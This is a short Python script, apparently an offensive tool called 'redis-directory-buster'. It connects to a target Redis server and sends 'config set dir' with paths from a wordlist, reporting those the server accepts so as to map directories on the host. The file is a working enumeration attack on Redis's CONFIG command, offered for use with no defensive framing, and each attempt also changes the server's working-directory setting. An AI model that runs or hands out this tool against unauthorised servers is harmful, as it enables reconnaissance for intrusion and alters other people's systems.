import socket
import argparse

class Main:
	def __init__(self):
		parser = argparse.ArgumentParser(
			prog="redis-directory-buster",
			description="Perform directory enumeration by using redis",
			epilog="")

		parser.add_argument('--rhost', required=True, help='IP address or hostname of the target redis server')
		parser.add_argument('--rport', default=6379, required=False, help='Port of the target redis server. Default:6379')
		parser.add_argument('--wordlist', required=True, help='File to use to find paths, containing, e.g. /var/ or /var/lib line per line.')		
		args = parser.parse_args()
		self.brute_force(args.rhost, args.rport, args.wordlist)

	def brute_force(self, ip, port, wordlist):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))
		
		with open(wordlist, "r") as file:
			for line in file:
				command = f"config set dir {line}\n"
				s.send(command.encode())
				print(line, end="") if s.recv(1024).strip().decode() == "+OK" else None

		s.close()

if __name__ == "__main__":
	main = Main()

